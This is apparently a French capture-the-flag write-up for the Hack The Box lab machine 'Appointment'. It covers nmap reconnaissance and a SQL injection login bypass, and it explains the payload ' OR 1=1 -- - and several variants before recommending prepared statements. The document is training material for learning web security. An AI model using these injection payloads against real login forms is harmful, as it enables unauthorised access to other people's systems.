# Appointment — HTB Starting Point (Tier 1)

| | |
|---|---|
| **Section** | Starting Point — Tier 1 |
| **Machine** | `Appointment` |
| **OS** | Linux (Debian) |
| **IP cible** | `10.129.160.1` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-02 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque

```
nmap  →  80/tcp : Apache 2.4.38, page "Login"
      →  formulaire de connexion -> injection SQL (auth bypass)
      →  username = ' OR 1=1 -- -   →  connexion acceptee  →  flag
```

---

## 1. Reconnaissance

```bash
box appointment <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
```

| Port | Service | Version |
|---|---|---|
| 80/tcp | http | Apache httpd 2.4.38 (Debian) — `http-title: Login` |

Un seul port, une page de **login**. Tout se joue dans le formulaire.

---

## 2. Accès → flag

**Le concept — Injection SQL (SQLi).** Le serveur construit sa requête d'authentification en **concaténant** directement ta saisie :

```sql
SELECT * FROM users WHERE username='<saisie>' AND password='<saisie>';
```

Sans filtrage, on peut **casser la requête** et la rendre toujours vraie.

**Payload dans le champ `username`** (mot de passe : n'importe quoi) :

```
' OR 1=1 -- -
```

Décorticage :
- `'` ferme la chaîne du username ouverte par l'appli ;
- `OR 1=1` → condition **toujours vraie**, renvoie le 1er utilisateur ;
- `-- -` commente le reste (`AND password=...`) → la vérif du mot de passe est ignorée.

Requête effective :

```sql
SELECT * FROM users WHERE username='' OR 1=1 -- -' AND password='...';
```

→ connexion acceptée, le **flag s'affiche** sur la page après login.

> Variantes si la 1re ne passe pas : `admin' -- -`, `' OR '1'='1`, `') OR 1=1 -- -`.
> Le `-- -` (avec l'espace final) est important : en SQL, `--` doit être suivi d'un espace.

---

## 3. Leçons à retenir

- **Toute saisie utilisateur est suspecte** : un formulaire qui colle l'entrée dans une requête SQL = injection possible.
- **Auth bypass SQLi** : `' OR 1=1 -- -` rend la condition vraie et commente la vérif du mot de passe. Le payload à connaître par cœur.
- **Syntaxe des commentaires SQL** : `-- ` (tiret-tiret-espace) en MySQL/MariaDB ; `#` fonctionne aussi. D'où le `-- -`.
- **Faire à la main avant d'automatiser** : comprendre pourquoi le payload marche > lancer `sqlmap` sans réfléchir. `sqlmap` viendra pour les cas plus complexes.
- **Défense** : requêtes préparées / paramétrées (*prepared statements*) — jamais de concaténation de saisie dans du SQL.

---

## Commandes — récap express

```bash
box appointment <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP     # -> 80 Login
# Firefox (make gui) -> http://$IP -> champ username :
#   ' OR 1=1 -- -
# -> flag affiche apres connexion
```
